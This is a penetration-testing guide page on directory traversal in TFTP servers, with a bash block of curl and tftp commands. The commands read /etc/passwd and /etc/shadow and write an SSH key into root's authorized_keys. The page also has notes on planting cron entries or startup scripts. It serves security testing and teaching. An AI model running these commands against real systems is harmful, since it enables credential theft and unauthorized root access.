---
title: "Directory traversal: escaping the TFTP root"
order: 2
description: "A TFTP server is meant to serve only its configured root directory, but implementations that fail to sanitise the requested filename allow path traversal, using ../ sequences or absolute paths, to read and write files anywhere the server process can reach. This turns a device-boot service into arbitrary host file read and, where writable, write."
keywords:
  - tftp traversal
  - path traversal
  - ../
  - absolute path
  - arbitrary file read
---

# Directory traversal

TFTP servers should confine requests to their root directory, but many implementations (especially on embedded devices and older daemons) do not properly sanitise the requested filename. Where that is the case, an attacker includes `../` sequences or an absolute path in the RRQ/WRQ filename to escape the root and read or write any file the server process can access. This elevates TFTP from serving a fixed set of boot files to arbitrary file read, and, if writes are allowed, arbitrary file write, on the host.

```bash
# attempt traversal reads (syntax varies by server; try both forms)
curl -s tftp://<target>/../../../../etc/passwd -o passwd && cat passwd
tftp <target> -c get ../../../../etc/shadow shadow 2>/dev/null
# absolute-path form, where the server honours it
curl -s tftp://<target>//etc/passwd -o passwd
# traversal write (if writes allowed and sanitisation is absent)
curl -s -T key tftp://<target>/../../../../root/.ssh/authorized_keys
```

## Exploitation notes

- Try both `../` traversal and absolute-path requests; different servers mishandle one or the other, and embedded TFTP daemons are frequent offenders.
- Arbitrary read targets the usual host secrets (`/etc/shadow`, SSH keys, application configs) reachable to the TFTP process's privileges; TFTP often runs privileged on devices.
- Arbitrary write, when sanitisation is absent and writes are enabled, is the strongest outcome: write an `authorized_keys`, a cron entry, or a startup script the host executes.
- The process's privilege bounds reach; on many embedded devices TFTP runs as root, so traversal read/write is effectively unrestricted on the device.

## References

- [RFC 1350 (TFTP)](https://datatracker.ietf.org/doc/html/rfc1350)
- [HackTricks: TFTP traversal](https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp)
